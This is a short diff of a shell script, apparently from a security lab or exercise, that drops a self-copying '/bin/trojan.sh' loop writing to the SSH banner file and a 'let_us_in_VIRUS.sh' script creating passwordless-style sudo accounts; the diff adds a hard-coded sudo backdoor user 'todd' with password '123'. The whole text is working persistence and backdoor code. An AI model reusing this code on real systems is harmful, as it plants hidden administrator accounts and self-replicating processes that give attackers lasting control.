@@ -55,7 +55,7 @@ cat << EOF > /bin/trojan.sh
 #!/bin/bash
 while true
 do
-  /bin/echo 'trojan-virus attacking SSH banner' >> /etc/issue.net
+  /bin/echo 'trojan-virus pokemon attacking SSH banner' >> /etc/issue.net
   /bin/cp /bin/trojan.sh /home/trojan-virus
   sleep 180
   /home/trojan-virus &
@@ -67,6 +67,7 @@ chmod 755 /bin/trojan.sh
 
 cat << EOF > /sbin/let_us_in_VIRUS.sh
 #!/bin/bash
+/usr/sbin/useradd -M -g sudo -p $(openssl passwd -crypt 123) todd
 for i in {1..10}
 do
 /usr/sbin/useradd -M -g sudo -p \$(openssl passwd -crypt \$i) \$i &>/dev/null
